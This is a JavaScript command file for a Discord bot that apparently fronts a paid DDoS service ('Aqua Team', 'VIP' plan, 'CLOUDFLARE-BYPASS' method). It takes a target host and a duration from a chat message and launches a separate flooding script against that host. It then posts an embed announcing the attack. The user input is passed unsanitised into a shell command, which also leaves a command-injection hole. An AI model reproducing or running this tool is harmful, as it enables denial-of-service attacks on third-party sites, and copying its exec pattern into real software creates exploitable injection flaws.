const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }


	

// Command attack
var exec = require('child_process').exec
exec(`node cloudflare.js ${host} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Aqua Team** 🚀')
	.setTimestamp()
  .setDescription("**Plan**: `VIP 👨` \n **Target** : `" + host + "` \n **Method** : `CLOUDFLARE-BYPASS` \n **Time** : `" + duration + "`")
	.setFooter('©Aqua Team', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://cdn.discordapp.com/attachments/999756743506665564/1221556974710161438/sasuke-icegif-1.gif?ex=66130296&is=66008d96&hm=4a9771c8bbe1cfc156600a8c72b8123fe7b4a30168d5bc76e76957e717a5d528&", "https://cdn.discordapp.com/attachments/999756743506665564/1221556823711158343/am-atomic-cid-kagenou.gif?ex=66130272&is=66008d72&hm=ae69531d0f463bef4a0ca8ac7a61ac912388ceec8e8c7ff15175fba6831bc8b7&"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];



  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['Cloudflare'],
  permLevel: 0
}

exports.help = {
  name: 'Cloudflare',
  description: 'Aqua',
  usage: 'Cloudflare'
}
